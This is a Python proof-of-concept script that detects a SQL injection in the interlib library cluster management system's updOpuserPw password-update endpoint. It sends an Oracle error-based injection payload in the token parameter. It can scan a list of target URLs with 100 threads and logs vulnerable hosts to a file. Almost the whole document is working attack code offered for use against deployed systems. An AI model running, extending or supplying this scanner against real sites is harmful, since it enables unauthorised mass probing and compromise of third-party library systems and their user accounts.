import sys
import requests
import argparse
import logging
from multiprocessing.dummy import Pool

# 禁用 urllib3 警告
requests.packages.urllib3.disable_warnings()

# 设置日志记录
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'

# 定义程序的横幅
def banner():
    test = r"""

  _              _             
 (_)            (_)            
  ___      _____ _ _ __   __ _ 
 | \ \ /\ / / _ \ | '_ \ / _` |
 | |\ V  V /  __/ | | | | (_| |
 |_| \_/\_/ \___|_|_| |_|\__,_|



                            version:1.1.0
                            author:fangwei                                   
"""
    logging.info(test)

# 主函数，解析命令行参数并调用相应的功能函数
def main():
    banner()
    parser = argparse.ArgumentParser(description="图书馆集群管理系统 interlib updOpuserPw SQL注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='File Path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        # 多线程处理
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        logging.error("Usage:\n\t python3 {} -h".format(sys.argv[0]))

# 检测漏洞函数，向目标URL发送请求，检查是否存在漏洞
def poc(target):
    payload_url = '/interlib3/service/sysop/updOpuserPw?loginid=test&newpassword=12356&token=1%27and+ctxsys.drithsx.sn(1,(select%20MOD(9,9)%20from%20dual))=%272'
    url = target + payload_url
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
    }
    proxy = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080',
    }

    try:
        res = requests.post(url=url, headers=headers, timeout=5, verify=False)

        if res.status_code == 200 and "message" in res.text:
            logging.info(f"{GREEN}[+] 该网站存在 SQL 注入漏洞，url为 {target}{RESET}")
            with open("tushure.txt", "a", encoding="utf-8") as fp:
                fp.write(target + '\n')
        else:
            logging.info(f"[-] 该网站不存在 SQL 注入漏洞，url为 {target}")

    except Exception as e:
        logging.error(f"[*] 该网站无法访问，url为 {target}, 错误信息: {e}")

# 程序入口点
if __name__ == '__main__':
    main()
